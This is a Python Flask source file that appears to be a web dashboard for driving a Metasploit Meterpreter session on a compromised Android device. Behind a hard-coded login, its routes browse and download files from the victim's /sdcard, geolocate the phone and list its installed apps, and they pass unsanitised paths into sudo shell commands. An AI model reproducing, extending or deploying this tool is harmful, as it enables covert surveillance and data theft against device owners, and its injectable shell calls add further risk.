from flask import Flask, render_template, request, redirect, url_for, session, send_file
import subprocess
import os

app = Flask(__name__)
app.secret_key = 'supersecurekey'

USERNAME = 'raidenkk'
PASSWORD = 'adminexploit'

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == USERNAME and request.form['password'] == PASSWORD:
            session['logged_in'] = True
            return redirect('/dashboard')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('dashboard.html')

# @app.route('/storage') DESATIVADO
def storage():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    os.system("echo 'pwd' | msfconsole -q -x 'sessions -i 1; ls; exit' > meterpreter/storage.txt")
    with open("meterpreter/storage.txt", "r") as f:
        content = f.read()
    
    files_html = ""
    for line in content.splitlines():
        if " " in line and "." in line:
            fname = line.split()[-1]
            files_html += f'<a href="/download/{fname}" style="display:block;color:cyan;">{fname}</a>'
    return f"<pre>{files_html if files_html else content}</pre>"


@app.route('/geolocation')
def geolocation():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    os.system("echo 'pwd' | msfconsole -q -x 'sessions -i 1; geolocate; exit' > meterpreter/geo.txt")
    with open("meterpreter/geo.txt", "r") as f:
        content = f.read()
    
    files_html = ""
    for line in content.splitlines():
        if " " in line and "." in line:
            fname = line.split()[-1]
            files_html += f'<a href="/download/{fname}" style="display:block;color:cyan;">{fname}</a>'
    return f"<pre>{files_html if files_html else content}</pre>"


@app.route('/apps')
def apps():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    os.system("echo 'pwd' | msfconsole -q -x 'sessions -i 1; app_list; exit' > meterpreter/apps.txt")
    with open("meterpreter/apps.txt", "r") as f:
        content = f.read()
    
    files_html = ""
    for line in content.splitlines():
        if " " in line and "." in line:
            fname = line.split()[-1]
            files_html += f'<a href="/download/{fname}" style="display:block;color:cyan;">{fname}</a>'
    return f"<pre>{files_html if files_html else content}</pre>"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

# @app.route('/download/<filename>') DESATIVADO
def download_file(filename):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    filepath = os.path.join('meterpreter', filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return "Arquivo não encontrado", 404


@app.route('/storage')
@app.route('/storage/<path:subpath>')
def storage(subpath=""):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    target_path = "/sdcard" + ("/" + subpath if subpath else "")
    cmd = f"sudo msfconsole -x \"sessions -i 1 && cd {target_path} && ls\""
    result = subprocess.getoutput(cmd)
    folder = os.path.join("meterpreter", "listing.txt")
    with open(folder, "w") as f:
        f.write(result)
    content = result.splitlines()
    links = []
    for line in content:
        parts = line.strip().split()
        if parts:
            name = parts[-1]
            if '.' in name:
                link = url_for('download_path', fullpath=f"{target_path}/{name}")
                links.append(f'<a href="{link}" style="color:cyan;display:block;">{name}</a>')
            else:
                sub_link = url_for('storage', subpath=os.path.join(subpath, name))
                links.append(f'<a href="{sub_link}" style="color:white;display:block;">[DIR] {name}</a>')
    return f"<h3 style='color:white;'>Navegando em: {target_path}</h3>" + "".join(links)


@app.route('/download_path')
def download_path():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    fullpath = request.args.get('fullpath')
    filename = os.path.basename(fullpath)
    cmd = f"sudo msfconsole -x \"sessions -i 1 && download {fullpath}\""
    result = subprocess.getoutput(cmd)
    filepath = os.path.join('meterpreter', filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return "Erro ao baixar arquivo", 500
